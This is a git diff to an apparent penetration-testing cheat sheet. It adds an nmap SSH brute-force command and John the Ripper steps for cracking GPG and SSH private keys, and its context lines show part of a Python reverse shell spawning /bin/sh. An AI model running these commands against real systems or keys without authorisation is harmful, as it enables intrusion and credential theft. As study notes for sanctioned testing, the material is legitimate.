@@ -30,6 +30,9 @@
 
 ```nmap -p <port> --script=nfs-ls,nfs-statfs,nfs-showmount <ip>```
 
+### Bruteforce SSH with script engine
+
+`nmap <host> -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt`
 
 ## Metasploit
 
@@ -161,3 +164,17 @@ os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
 p=subprocess.call(["/bin/sh","-i"])
 ```
+
+## John
+
+### gpg
+
+`gpg2john <gpg_key_file> > hash`
+
+`john --wordlist=/path/to/wordlist hash`
+
+### ssh
+
+`python /usr/share/john/ssh2john.py <ssh_key_file> > hash`
+
+`john --wordlist=/path/to/wordlist hash`
